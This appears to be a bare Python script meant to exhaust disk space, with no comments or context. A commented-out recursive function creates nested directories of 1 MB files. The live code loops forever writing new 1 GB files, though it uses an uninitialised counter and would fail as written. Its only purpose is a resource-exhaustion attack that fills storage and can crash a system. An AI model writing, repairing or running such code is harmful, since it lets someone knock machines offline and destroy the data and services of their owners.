# import os

# def create_files(directory):
#     os.chdir(directory)
#     for i in range(100):
#         filename = f"file_{i}.txt"
#         with open(filename, "w") as f:
#             f.write("a" * 1000000) # 1 MB of 'a' characters
#         if i % 10 == 0:
#             create_files(f"directory_{i}")
            
# create_files(".")

import os

while True :
    filename = "file{}.txt".format(i)
    file = open(filename,"w")
    file.write(" " * 1024 * 1024 * 1024)
    file.close()
    i += 1
